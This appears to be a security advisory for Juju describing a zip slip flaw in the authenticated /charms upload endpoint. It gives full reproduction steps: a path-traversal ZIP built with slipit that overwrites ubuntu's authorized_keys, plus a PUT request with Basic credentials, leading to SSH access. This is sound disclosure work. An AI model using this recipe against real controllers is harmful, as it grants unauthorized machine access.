summary: "Juju zip slip vulnerability via authenticated endpoint\n### Impact\n\nAny user with\
  \ a Juju account on a controller can upload a charm to the /charms endpoint.\nNo specific\
  \ permissions are required - it's just sufficient for the user to exist in the controller\
  \ user database.\nA charm which exploits the zip slip vulnerability may be used to allow such\
  \ a user to get access to a machine running a unit using the affected charm.\n\n### Details\n\
  \nA controller exposes three charm-related HTTP API endpoints, as follows:\n- PUT/GET https://<controller-ip>:17070/model-<model-uuid>/charms/<nameofcharm>-<hashofcharm>\n\
  - POST/GET https://<controller-ip>:17070/model-<model-uuid>/charms\n- GET https://<controller-ip>:17070/charms\n\
  \nThese endpoints require Basic HTTP authentication credentials and will accept any valid\
  \ user within the context of the controller. A user that has no specific permission or access\
  \ granted can call all of these APIs.\n\nTo reproduce:\n\n```\njuju bootstrap\njuju add-user\
  \ testuser\njuju change-user-password testuser\n```\n\nDownload the ZIP file of an arbitrary\
  \ charm eg [https://github.com/juju/hello-juju-charm](https://github.com/juju/hello-juju-charm)\n\
  \nDownload and install the following tool: [https://github.com/usdAG/slipit](https://github.com/usdAG/slipit)\n\
  \nRun the following command to generate a new SSH key pair: `ssh-keygen`\n\nCopy the contents\
  \ of the newly created public key into a file called `authorized_keys`\n\nRun the following\
  \ command to inject the malicious path into the ZIP file:\n```\nslipit hello.zip authorized_keys\
  \ --separator ../../../../../../home/\nubuntu/.ssh/\n```\n\nSend the PUT request below to\
  \ a model on the target controller. Note the following:\n- the model UUID and controller IP\
  \ address in the request must be updated\n- the Juju-Curl header needs to be sent with a value\
  \ that starts with the “local:” string\n- the PUT body content should have the exact contents\
  \ of the ZIP file\n- the Basic Authorization header should be tied to the user that was created\
  \ above\n- the first time that the request is sent, an error will be returned that states\
  \ that the SHA hash in the URL is invalid. When this occurs, copy the value in the response\
  \ and replace it in the final part of the URL (i.e. `pathtw-<updated-sha>`)\n- \n```\nPUT\
  \ /model-34bb5ef0-5a3e-41d7-873c-2f884adf606d/charms/pathtw-5c9f25c\nHTTP/1.1\nHost: 10.4.154.217:17070\n\
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko\n/20100101 Firefox/135.0\n\
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language:\
  \ en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest:\
  \ document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\nPriority:\
  \ u=0, i\nTe: trailers\nConnection: keep-alive\nContent-Length: 40021\nContent-Type: application/zip\n\
  Juju-Curl: local:pathtw\nAuthorization: Basic dXNlci10ZXN0dXNlcjpwYXNzd29yZA==\n<ZIP BODY\
  \ Content>\n```\n\nObserve that the response states that the charm has been uploaded.\n\n\
  Attempt to SSH to the controller by using the private key that was generated above.\n\nObserve\
  \ that it is possible to authenticate because the file has been overwritten.\n\n### Code\n\
  \nThe /charms handlers are registered here\nhttps://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L897\n\
  https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L990\n\nAnd the only auth required\
  \ is that the incoming request be for an authenticated user\n\nhttps://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L754\n\
  \nbut no specific permission checks are done.\n\n### Workarounds\nThere are no known workarounds.\n\
  \n### References\n[F-02](https://drive.google.com/file/d/1pHRNiaA8LyMVJYwIyTqelsqJ9FmImDf0/view)"
